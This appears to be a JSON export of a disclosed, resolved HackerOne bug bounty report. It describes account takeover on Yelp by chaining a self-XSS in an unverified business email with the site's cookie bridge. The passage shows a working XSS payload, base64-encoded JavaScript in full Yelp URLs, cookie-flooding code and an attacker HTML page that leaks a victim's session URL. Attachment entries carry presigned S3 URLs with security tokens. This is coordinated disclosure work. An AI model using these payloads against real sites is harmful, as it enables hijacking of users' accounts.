@@ -1,0 +1,564 @@
+{
+  "id": 2089042,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yMDg5MDQy",
+  "url": "https://hackerone.com/reports/2089042",
+  "title": "yelp.com and biz.yelp.com ATO via XSS + Cookie Bridge",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "readable_substate": "Resolved",
+  "created_at": "2023-07-28T23:12:10.173Z",
+  "submitted_at": "2023-07-28T23:12:10.305Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "lil_endian",
+    "url": "/lil_endian",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/9twt9d0lw2i8ezf2u95l60ovgxpu/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 545,
+    "url": "https://hackerone.com/yelp",
+    "handle": "yelp",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/545/de556165eaf2da7600f9ce75d1179281ee2d538f_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/545/de556165eaf2da7600f9ce75d1179281ee2d538f_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+    },
+    "permissions": [
+
+    ],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "Yelp",
+      "twitter_handle": "",
+      "website": "https://www.yelp.com",
+      "about": "Connecting people to great local businesses in communities around the world."
+    }
+  },
+  "has_bounty?": true,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+
+  ],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2023-09-08T07:22:23.705Z",
+  "bug_reporter_agreed_on_going_public_at": "2023-09-08T07:22:23.564Z",
+  "team_member_agreed_on_going_public_at": "2023-08-10T20:15:02.725Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "# Summary\nI've found an XSS on `biz.yelp.com` where the unverified email will be reflected in a message, prompting the user to verify the email. This XSS can be combined with the cookie bridge functionality to target other uses with the XSS. The XSS can then be combined with the cookie bridge a second time to leak `HttpOnly` session cookies, and makes account takeover possible for both business accounts and regular accounts.\n\n# Description\n## XSS in business user email\nWhen a business user has not verified their email, a message is shown telling them to verify the email. The users email is reflected in this message, and it's possible to choose an email that will result in XSS.\n{F2544123}\nThere is a 64 char limit on the chosen email, but it's just enough to achieve arbitrary javascript execution by choosing the email\n```\n\"<iframe/onload=eval(atob(location.hash.substring(1)))>\"@calc.sh\n```\nand putting the payload base64 encoded in the url fragment\n{F2544129}\n{F2544130}\n\nAt this point this is just a Self-XSS, but I'll show how this can be used to target other uses.\n\n## yelp.com's Cookie Bridge\nYelp has local versions of the website, so a user requesting the site in danish, will be redirected to `yelp.dk` and a user requesting the site in german will be redirected to `yelp.de`. If a users is signed into `yelp.com` and wishes to change language to danish, they can't just be sent to `yelp.dk` without having to log in again since `yelp.com` and `yelp.dk` are 2 completely different domains in the eyes of the browser, and so the users session cookies can't be used for both domains.\n\nTo solve this challenge, Yelp has implemented a Cookie Bridge that works by sending a GET request to `https://biz.yelp.com/cookie_bridge/store?dhl=da_DK`. The backend will take all the users cookies and save them, redirect them to `https://biz.yelp.dk/cookie_bridge/retrieve?cookie_fsid=qCN_L-QbDTAVmqgKIAs2Dw&redir=%2F` which will then set the same cookies for the `yelp.dk` domain. The value of the `cookie_fsid` is unique for our cookies, and can only be used to retrieve the cookies once. \n\n## Using the Cookie Bridge to sign other users into our account\nWe can use the Cookie bridge to sign a victim into our account. While signed into our account on `biz.yelp.com` we send a request to `https://biz.yelp.com/cookie_bridge/store?dhl=da_DK`. This will result in a `303` redirect to `https://biz.yelp.dk/cookie_bridge/retrieve?cookie_fsid=qCN_L-QbDTAVmqgKIAs2Dw&redir=%2F`. Instead of following the redirect we can have a victim visit the link, and they'll then be signed into our business user on `biz.yelp.dk`. We can even use the `redir` parameter to redirect the victim to `/home#[OUR BASE64 ENCODED XSS PAYLOAD]` and have the XSS trigger\n\n## Using the XSS for ATO\nThe situation is as follows: The victim is logged in on `biz.yelp.com`. We sign the victim into the attacker account on `biz.yelp.dk` where our XSS triggers. The XSS can't make any changes to the victim account due to `biz.yelp.com` and `biz.yelp.dk` being different domains. For the XSS to be effective we need to sign the victim account into `biz.yelp.dk`\nThe attack looks like this:\n- Victim is logged into `biz.yelp.com`.\n- The victim clicks on our page, which open a new tab. We'll call the opener tab \"Tab A\" and the new tab \"Tab B\". Tab B will load the cookie bridge retrieve endpoint that signs the victim into our attacker account on `biz.yelp.dk`, and triggers the XSS:\n```\nhttps://biz.yelp.dk/cookie_bridge/retrieve?cookie_fsid=qCN_L-QbDTAVmqgKIAs2Dw&redir=/home/%23[XSS PAYLOAD BASE64 ENCODED]\n```\n- Now we have javascript execution in Tab B. We now get a reference to Tab A and redirects it via `window.opener.location.href = \"https://biz.yelp.com/cookie_bridge/store?dhl=da_DK\"`. This will sign the victim into their own account on `biz.yelp.dk`. But our XSS is still alive in Tab B so we can now make requests from `biz.yelp.dk` with the victims session cookies.\n\nAt this point we're turned what started as a Self-XSS into regular XSS in the victims session. But we can improve the attack to steal the session cookies of the victims account, even though they're marked `HttpOnly` and not available from javascript. To do this we change the last step above and do the following instead:\n- Using our XSS in Tab B we set several large cookies on `biz.yelp.dk` for the path `/cookie_bridge/retrieve`.:\n```javascript\nfor (var i = 0; i < 15; i++) {document.cookie = `X${i}=${'X'.repeat(1000)}; max-age=86400; path=/cookie_bridge/retrieve`}\n```\nthis will make all requests to `https://biz.yelp.dk/cookie_bridge/retrieve` fail, as openresty will complain that the cookie is too large. This will prevent the `cookie_fsid` token from being consumed:\n{F2544131}\n\n- We now point Tab A to `https://biz.yelp.com/cookie_bridge/store?dhl=da_DK` which will attempt to transfer the victim account cookies to `biz.yelp.dk`, but will end up failing with a 400 error page since the cookie header is too large.\n- Now Tab B can access Tab A's location via `window.opener.location.href` since they share the same origin `biz.yelp.dk`. Tab B can now leak the retrieve url for the victims session cookies, and the attacker can simply visit this url to be signed in as the victim. This works for both business accounts and regular yelp accounts.\n\n# POC and video\nWe create a business account with the email `\"<iframe/onload=eval(atob(location.hash.substring(1)))>\"@calc.sh` without verifying it to get the Self-XSS gadget we need.\n\nUsing this account we make a request to `https://biz.yelp.com/cookie_bridge/store?dhl=da_DK&redir=/home/%23Zm9yICh2YXIgaSA9IDA7IGkgPCAxNjsgaSsrKSB7ZG9jdW1lbnQuY29va2llID0gYFgke2l9PSR7J1gnLnJlcGVhdCgxMDAwKX07IG1heC1hZ2U9ODY0MDA7IHBhdGg9L2Nvb2tpZV9icmlkZ2UvcmV0cmlldmVgfQp3aW5kb3cub3BlbmVyLnBvc3RNZXNzYWdlKHtyZWRpcmVjdDoiaHR0cHM6Ly9iaXoueWVscC5jb20vY29va2llX2JyaWRnZS9zdG9yZT9kaGw9ZGFfREsifSwgIioiKTsKc2V0VGltZW91dChmdW5jdGlvbigpIHthbGVydCgiYXR0YWNrZXIgY2FuIG5vdyBzaWduIGluIGFzIHZpY3RpbSBieSBnb2luZyB0bzoiICsgd2luZG93Lm9wZW5lci5sb2NhdGlvbi5ocmVmKX0sIDUwMDApOw%3D%3D` which returns a 303 redirect to\n`https://biz.yelp.dk/cookie_bridge/retrieve?cookie_fsid=cZ1U9eNTN2is8YaF4pCBWA&redir=%2Fhome%2F%23Zm9yICh2YXIgaSA9IDA7IGkgPCAxNjsgaSsrKSB7ZG9jdW1lbnQuY29va2llID0gYFgke2l9PSR7J1gnLnJlcGVhdCgxMDAwKX07IG1heC1hZ2U9ODY0MDA7IHBhdGg9L2Nvb2tpZV9icmlkZ2UvcmV0cmlldmVgfQp3aW5kb3cub3BlbmVyLnBvc3RNZXNzYWdlKHtyZWRpcmVjdDoiaHR0cHM6Ly9iaXoueWVscC5jb20vY29va2llX2JyaWRnZS9zdG9yZT9kaGw9ZGFfREsifSwgIioiKTsKc2V0VGltZW91dChmdW5jdGlvbigpIHthbGVydCgiYXR0YWNrZXIgY2FuIG5vdyBzaWduIGluIGFzIHZpY3RpbSBieSBnb2luZyB0bzoiICsgd2luZG93Lm9wZW5lci5sb2NhdGlvbi5ocmVmKX0sIDUwMDApOw%3D%3D`.\n{F2544134}\n\nGetting this URL can obviously be automated, but for this POC we're just getting it manually and giving it as an argument to our POC HTML attack page. The attacker page looks like this:\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n  <meta charset=\"UTF-8\">\n  <title>yelp xss poc</title>\n  <script>\n    function openTarget() {\n      t = document.location.hash.substring(1);\n      window.target = window.open(t);\n    }\n\n    // register a postmessage listener\n    window.addEventListener('message', function (e) {\n      console.log(e);\n      if (e.data && e.data.redirect) {\n        location.href = e.data.redirect; // this is vulnerable to xss but idc\n      }\n    });\n\n  </script>\n</head>\n<body>\n  <h1>Yelp.com account takeover POC</h1>\n  <button onclick=\"openTarget()\">click here to start attack</button>\n</body>\n</html>\n\n```\nand is hosted here: `https://calc.sh/yelp-poc-bah7ooli.html`.\nWhen the victim clicks our link in their browser they'll be signed in to our attacker account and the XSS payload will run. The payload is base64 encoded and the decoded payload looks like this:\n```javascript\nfor (var i = 0; i < 16; i++) {document.cookie = `X${i}=${'X'.repeat(1000)}; max-age=86400; path=/cookie_bridge/retrieve`}\nwindow.opener.postMessage({redirect:\"https://biz.yelp.com/cookie_bridge/store?dhl=da_DK\"}, \"*\");\nsetTimeout(function() {alert(\"attacker can now sign in as victim by going to:\" + window.opener.location.href)}, 5000);\n```\nThis code will set 16 large cookies each containing 1000 'X' chars. This will be enough to trigger the 400 error. After setting the cookies we find the opener tab, and send a postMessage asking it to redirect to `https://biz.yelp.com/cookie_bridge/store?dhl=da_DK` (_I'm using postMessage to do the redirect so that the attack also works in Firefox. In Chrome we could simply set `window.opener.location.href`, but that doesn't work in Firefox for some reason_). The browser will be redirected to `https://biz.yelp.dk/cookie_bridge/retrieve?cookie_fsid=[FSID VALUE]` but will trigger the 400 error such that the `cookie_fsid` won't be consumed. The last line in our payload can now read the href of the opener window as they share the same origin, and we show the url in an alert box to demonstrate the attacker now has the url and can sign in as the victim.\n\nThis video shows the attack explained above, and demonstrates that the attacker is able to take over both a normal yelp account and a business account.\n{F2544137}\n\n## Impact\n\nAn attacker can leak the session cookies of a victim even though they're set as HttpOnly and sign in to the victims account. This works for both normal accounts and business accounts.",
+  "weakness": {
+    "id": 60,
+    "name": "Cross-site Scripting (XSS) - Generic"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 2544123,
+      "file_name": "2023-07-28-160236_1293x572_scrot.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/bvybe9344t990blhaddw08u5w1rx?response-content-disposition=attachment%3B%20filename%3D%222023-07-28-160236_1293x572_scrot.png%22%3B%20filename%2A%3DUTF-8%27%272023-07-28-160236_1293x572_scrot.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQU5JYKTGM%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T065318Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQDPextUgVMaFUn7J3YE8kNYUZyiY2543ePlEF9CwFfM8QIhAIRilag%2FrZ1iszKpt2JLQyz8teMsWBamJF4Iou7wqMU3KrIFCCMQAxoMMDEzNjE5Mjc0ODQ5Igwu56k94pqVtX8r%2Bo4qjwXEh1PM7wf2Np3Qm66HGnlSD0VTqg7R%2FtI4UnXMImbHLHRC5z94z14%2FX2eWyQeiZAAq3PHSCaPLB7tsZX%2ByCkLvYSKIVEDIBAiJLNfPf0mrHAbRDGyc8keEypRUwMaT5cop25r%2FpVpMdM%2BVhJVrWWa5ovVSzsmubSxixbH%2BvSDMHrKZm1mklKunLYykTJQX%2BiX5bQw3i%2BjEj3n27mXAVXGx17uJj4AZzaAdAN%2Fb7nblHihfCONYhSlmArkzxiwacZx5n%2BkCMiJbI49SZjueO3VcmcjD7qJl9BwZ1W4QT01LH5E0r%2FauBeDReLPQR2A89V610Uem1zJCLjoNtjcpr%2Fy6PNyHeeAwa067JLmyxsCZL2gdW81O9EGHtcrxXf7TlH8A3h0yPO%2B8zVoyJSSsEzzjpzkscidQ86LAyX6CNqqcdHnUJsXeboKB5dqjOphDJLDRfmLzgZTuPihjRKzkML0G3QjO1fWCgDatC%2FHiCuz%2F4Hm5bamHTrdiVE9y%2B%2Bv6QZ2edEQAzLX1lowLp2RzYtTYHwDzZkAjKZJKVeO9zj1pkoJhjfz2VARzHSySfXw0YMwPUVlRPg7L6f%2BQAjpso7C6uYEeozwfIwrkmBFVTZW%2BLEzdRLHNNz7rHyr9w1WlRj4OjJLn5Ee5sdJ5cEyQgF8ir1s09BXAP%2FsqR7THqh25ijYpQsYTzGdJxWFw9Mcq455M0MG7I8oz1i3cTjV9eJJer5Vnjtubr681ZNh6Cbl85VC5gKL3xiZ%2BRa64M54QAtb9tRvCFdlmV7U2Yel7eiB1thRiUc%2BQBXeECkUKbOXNfSGQ6%2FRqu7AD4Qz0GIKmc6obQ3vJeTlVjbt80VYdsyGeWYLjRSjnDrYNEFDoOJTBMPSHuagGOrABfJMTnU4%2FETzLB2BZXf541hyjNiWZ3tqKyh4p%2BOtMGjGYCmsTcu5RXXYGZ3G0puxZ27J20XRP2zhvuPBXAixyr8lz8adwCOfLJe0oCYgqgYmQxwbXeE5pLP9eHwIk2aiqxaN2tTNVGnFifZgT%2BzaAvEW1M5e4bcPdHOcraaqJVAJKjLuYHBPVtsgKcNUbL9bdOH2zFoQgd6ok2JFMDfaY%2FOJ38QDDXR4GXVTD01IxQcc%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=b1cd8b769348f2d6f5af21b49b8085fb1f0901071b5885c17c803696825bd280",
+      "file_size": 98289,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 2544129,
+      "file_name": "2023-07-28-161149_1206x805_scrot.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/f10yz2i0w55d7tlj23pjhsj8wug8?response-content-disposition=attachment%3B%20filename%3D%222023-07-28-161149_1206x805_scrot.png%22%3B%20filename%2A%3DUTF-8%27%272023-07-28-161149_1206x805_scrot.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQU5JYKTGM%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T065318Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQDPextUgVMaFUn7J3YE8kNYUZyiY2543ePlEF9CwFfM8QIhAIRilag%2FrZ1iszKpt2JLQyz8teMsWBamJF4Iou7wqMU3KrIFCCMQAxoMMDEzNjE5Mjc0ODQ5Igwu56k94pqVtX8r%2Bo4qjwXEh1PM7wf2Np3Qm66HGnlSD0VTqg7R%2FtI4UnXMImbHLHRC5z94z14%2FX2eWyQeiZAAq3PHSCaPLB7tsZX%2ByCkLvYSKIVEDIBAiJLNfPf0mrHAbRDGyc8keEypRUwMaT5cop25r%2FpVpMdM%2BVhJVrWWa5ovVSzsmubSxixbH%2BvSDMHrKZm1mklKunLYykTJQX%2BiX5bQw3i%2BjEj3n27mXAVXGx17uJj4AZzaAdAN%2Fb7nblHihfCONYhSlmArkzxiwacZx5n%2BkCMiJbI49SZjueO3VcmcjD7qJl9BwZ1W4QT01LH5E0r%2FauBeDReLPQR2A89V610Uem1zJCLjoNtjcpr%2Fy6PNyHeeAwa067JLmyxsCZL2gdW81O9EGHtcrxXf7TlH8A3h0yPO%2B8zVoyJSSsEzzjpzkscidQ86LAyX6CNqqcdHnUJsXeboKB5dqjOphDJLDRfmLzgZTuPihjRKzkML0G3QjO1fWCgDatC%2FHiCuz%2F4Hm5bamHTrdiVE9y%2B%2Bv6QZ2edEQAzLX1lowLp2RzYtTYHwDzZkAjKZJKVeO9zj1pkoJhjfz2VARzHSySfXw0YMwPUVlRPg7L6f%2BQAjpso7C6uYEeozwfIwrkmBFVTZW%2BLEzdRLHNNz7rHyr9w1WlRj4OjJLn5Ee5sdJ5cEyQgF8ir1s09BXAP%2FsqR7THqh25ijYpQsYTzGdJxWFw9Mcq455M0MG7I8oz1i3cTjV9eJJer5Vnjtubr681ZNh6Cbl85VC5gKL3xiZ%2BRa64M54QAtb9tRvCFdlmV7U2Yel7eiB1thRiUc%2BQBXeECkUKbOXNfSGQ6%2FRqu7AD4Qz0GIKmc6obQ3vJeTlVjbt80VYdsyGeWYLjRSjnDrYNEFDoOJTBMPSHuagGOrABfJMTnU4%2FETzLB2BZXf541hyjNiWZ3tqKyh4p%2BOtMGjGYCmsTcu5RXXYGZ3G0puxZ27J20XRP2zhvuPBXAixyr8lz8adwCOfLJe0oCYgqgYmQxwbXeE5pLP9eHwIk2aiqxaN2tTNVGnFifZgT%2BzaAvEW1M5e4bcPdHOcraaqJVAJKjLuYHBPVtsgKcNUbL9bdOH2zFoQgd6ok2JFMDfaY%2FOJ38QDDXR4GXVTD01IxQcc%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=d56c2d011d34f6c2a526616717713f646906674a2c5537221601140e9b1d25b4",
+      "file_size": 75839,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 2544130,
+      "file_name": "2023-07-28-161210_1202x803_scrot.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/nd09w76timz24g46ukx34e8pg2g2?response-content-disposition=attachment%3B%20filename%3D%222023-07-28-161210_1202x803_scrot.png%22%3B%20filename%2A%3DUTF-8%27%272023-07-28-161210_1202x803_scrot.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQU5JYKTGM%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T065318Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQDPextUgVMaFUn7J3YE8kNYUZyiY2543ePlEF9CwFfM8QIhAIRilag%2FrZ1iszKpt2JLQyz8teMsWBamJF4Iou7wqMU3KrIFCCMQAxoMMDEzNjE5Mjc0ODQ5Igwu56k94pqVtX8r%2Bo4qjwXEh1PM7wf2Np3Qm66HGnlSD0VTqg7R%2FtI4UnXMImbHLHRC5z94z14%2FX2eWyQeiZAAq3PHSCaPLB7tsZX%2ByCkLvYSKIVEDIBAiJLNfPf0mrHAbRDGyc8keEypRUwMaT5cop25r%2FpVpMdM%2BVhJVrWWa5ovVSzsmubSxixbH%2BvSDMHrKZm1mklKunLYykTJQX%2BiX5bQw3i%2BjEj3n27mXAVXGx17uJj4AZzaAdAN%2Fb7nblHihfCONYhSlmArkzxiwacZx5n%2BkCMiJbI49SZjueO3VcmcjD7qJl9BwZ1W4QT01LH5E0r%2FauBeDReLPQR2A89V610Uem1zJCLjoNtjcpr%2Fy6PNyHeeAwa067JLmyxsCZL2gdW81O9EGHtcrxXf7TlH8A3h0yPO%2B8zVoyJSSsEzzjpzkscidQ86LAyX6CNqqcdHnUJsXeboKB5dqjOphDJLDRfmLzgZTuPihjRKzkML0G3QjO1fWCgDatC%2FHiCuz%2F4Hm5bamHTrdiVE9y%2B%2Bv6QZ2edEQAzLX1lowLp2RzYtTYHwDzZkAjKZJKVeO9zj1pkoJhjfz2VARzHSySfXw0YMwPUVlRPg7L6f%2BQAjpso7C6uYEeozwfIwrkmBFVTZW%2BLEzdRLHNNz7rHyr9w1WlRj4OjJLn5Ee5sdJ5cEyQgF8ir1s09BXAP%2FsqR7THqh25ijYpQsYTzGdJxWFw9Mcq455M0MG7I8oz1i3cTjV9eJJer5Vnjtubr681ZNh6Cbl85VC5gKL3xiZ%2BRa64M54QAtb9tRvCFdlmV7U2Yel7eiB1thRiUc%2BQBXeECkUKbOXNfSGQ6%2FRqu7AD4Qz0GIKmc6obQ3vJeTlVjbt80VYdsyGeWYLjRSjnDrYNEFDoOJTBMPSHuagGOrABfJMTnU4%2FETzLB2BZXf541hyjNiWZ3tqKyh4p%2BOtMGjGYCmsTcu5RXXYGZ3G0puxZ27J20XRP2zhvuPBXAixyr8lz8adwCOfLJe0oCYgqgYmQxwbXeE5pLP9eHwIk2aiqxaN2tTNVGnFifZgT%2BzaAvEW1M5e4bcPdHOcraaqJVAJKjLuYHBPVtsgKcNUbL9bdOH2zFoQgd6ok2JFMDfaY%2FOJ38QDDXR4GXVTD01IxQcc%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=2681e7a99d32f921da0b2716e19996d2c2a3782a76e4db8a41ef716c109d79b1",
+      "file_size": 241859,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 2544131,
+      "file_name": "2023-07-28-170955_1204x418_scrot.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/tgc0w9nyg0riynvekg11j1r9l7db?response-content-disposition=attachment%3B%20filename%3D%222023-07-28-170955_1204x418_scrot.png%22%3B%20filename%2A%3DUTF-8%27%272023-07-28-170955_1204x418_scrot.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQU5JYKTGM%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T065318Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQDPextUgVMaFUn7J3YE8kNYUZyiY2543ePlEF9CwFfM8QIhAIRilag%2FrZ1iszKpt2JLQyz8teMsWBamJF4Iou7wqMU3KrIFCCMQAxoMMDEzNjE5Mjc0ODQ5Igwu56k94pqVtX8r%2Bo4qjwXEh1PM7wf2Np3Qm66HGnlSD0VTqg7R%2FtI4UnXMImbHLHRC5z94z14%2FX2eWyQeiZAAq3PHSCaPLB7tsZX%2ByCkLvYSKIVEDIBAiJLNfPf0mrHAbRDGyc8keEypRUwMaT5cop25r%2FpVpMdM%2BVhJVrWWa5ovVSzsmubSxixbH%2BvSDMHrKZm1mklKunLYykTJQX%2BiX5bQw3i%2BjEj3n27mXAVXGx17uJj4AZzaAdAN%2Fb7nblHihfCONYhSlmArkzxiwacZx5n%2BkCMiJbI49SZjueO3VcmcjD7qJl9BwZ1W4QT01LH5E0r%2FauBeDReLPQR2A89V610Uem1zJCLjoNtjcpr%2Fy6PNyHeeAwa067JLmyxsCZL2gdW81O9EGHtcrxXf7TlH8A3h0yPO%2B8zVoyJSSsEzzjpzkscidQ86LAyX6CNqqcdHnUJsXeboKB5dqjOphDJLDRfmLzgZTuPihjRKzkML0G3QjO1fWCgDatC%2FHiCuz%2F4Hm5bamHTrdiVE9y%2B%2Bv6QZ2edEQAzLX1lowLp2RzYtTYHwDzZkAjKZJKVeO9zj1pkoJhjfz2VARzHSySfXw0YMwPUVlRPg7L6f%2BQAjpso7C6uYEeozwfIwrkmBFVTZW%2BLEzdRLHNNz7rHyr9w1WlRj4OjJLn5Ee5sdJ5cEyQgF8ir1s09BXAP%2FsqR7THqh25ijYpQsYTzGdJxWFw9Mcq455M0MG7I8oz1i3cTjV9eJJer5Vnjtubr681ZNh6Cbl85VC5gKL3xiZ%2BRa64M54QAtb9tRvCFdlmV7U2Yel7eiB1thRiUc%2BQBXeECkUKbOXNfSGQ6%2FRqu7AD4Qz0GIKmc6obQ3vJeTlVjbt80VYdsyGeWYLjRSjnDrYNEFDoOJTBMPSHuagGOrABfJMTnU4%2FETzLB2BZXf541hyjNiWZ3tqKyh4p%2BOtMGjGYCmsTcu5RXXYGZ3G0puxZ27J20XRP2zhvuPBXAixyr8lz8adwCOfLJe0oCYgqgYmQxwbXeE5pLP9eHwIk2aiqxaN2tTNVGnFifZgT%2BzaAvEW1M5e4bcPdHOcraaqJVAJKjLuYHBPVtsgKcNUbL9bdOH2zFoQgd6ok2JFMDfaY%2FOJ38QDDXR4GXVTD01IxQcc%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=d0ad91313eaba09299738c89ace339e6640972a7349d1baba6eac41c0c4c2b0e",
+      "file_size": 36979,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 2544134,
+      "file_name": "2023-07-28-172439_1624x1193_scrot.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/xbuaor61ug553x6fi9xj60yrx2uf?response-content-disposition=attachment%3B%20filename%3D%222023-07-28-172439_1624x1193_scrot.png%22%3B%20filename%2A%3DUTF-8%27%272023-07-28-172439_1624x1193_scrot.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQU5JYKTGM%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T065318Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQDPextUgVMaFUn7J3YE8kNYUZyiY2543ePlEF9CwFfM8QIhAIRilag%2FrZ1iszKpt2JLQyz8teMsWBamJF4Iou7wqMU3KrIFCCMQAxoMMDEzNjE5Mjc0ODQ5Igwu56k94pqVtX8r%2Bo4qjwXEh1PM7wf2Np3Qm66HGnlSD0VTqg7R%2FtI4UnXMImbHLHRC5z94z14%2FX2eWyQeiZAAq3PHSCaPLB7tsZX%2ByCkLvYSKIVEDIBAiJLNfPf0mrHAbRDGyc8keEypRUwMaT5cop25r%2FpVpMdM%2BVhJVrWWa5ovVSzsmubSxixbH%2BvSDMHrKZm1mklKunLYykTJQX%2BiX5bQw3i%2BjEj3n27mXAVXGx17uJj4AZzaAdAN%2Fb7nblHihfCONYhSlmArkzxiwacZx5n%2BkCMiJbI49SZjueO3VcmcjD7qJl9BwZ1W4QT01LH5E0r%2FauBeDReLPQR2A89V610Uem1zJCLjoNtjcpr%2Fy6PNyHeeAwa067JLmyxsCZL2gdW81O9EGHtcrxXf7TlH8A3h0yPO%2B8zVoyJSSsEzzjpzkscidQ86LAyX6CNqqcdHnUJsXeboKB5dqjOphDJLDRfmLzgZTuPihjRKzkML0G3QjO1fWCgDatC%2FHiCuz%2F4Hm5bamHTrdiVE9y%2B%2Bv6QZ2edEQAzLX1lowLp2RzYtTYHwDzZkAjKZJKVeO9zj1pkoJhjfz2VARzHSySfXw0YMwPUVlRPg7L6f%2BQAjpso7C6uYEeozwfIwrkmBFVTZW%2BLEzdRLHNNz7rHyr9w1WlRj4OjJLn5Ee5sdJ5cEyQgF8ir1s09BXAP%2FsqR7THqh25ijYpQsYTzGdJxWFw9Mcq455M0MG7I8oz1i3cTjV9eJJer5Vnjtubr681ZNh6Cbl85VC5gKL3xiZ%2BRa64M54QAtb9tRvCFdlmV7U2Yel7eiB1thRiUc%2BQBXeECkUKbOXNfSGQ6%2FRqu7AD4Qz0GIKmc6obQ3vJeTlVjbt80VYdsyGeWYLjRSjnDrYNEFDoOJTBMPSHuagGOrABfJMTnU4%2FETzLB2BZXf541hyjNiWZ3tqKyh4p%2BOtMGjGYCmsTcu5RXXYGZ3G0puxZ27J20XRP2zhvuPBXAixyr8lz8adwCOfLJe0oCYgqgYmQxwbXeE5pLP9eHwIk2aiqxaN2tTNVGnFifZgT%2BzaAvEW1M5e4bcPdHOcraaqJVAJKjLuYHBPVtsgKcNUbL9bdOH2zFoQgd6ok2JFMDfaY%2FOJ38QDDXR4GXVTD01IxQcc%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=1acf18066d0328b952f6f4f88a0c59c974e85c84a4515ca409cac7644106958e",
+      "file_size": 399315,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 2544137,
+      "file_name": "biz.yelp-yelp-ato-poc.mp4",
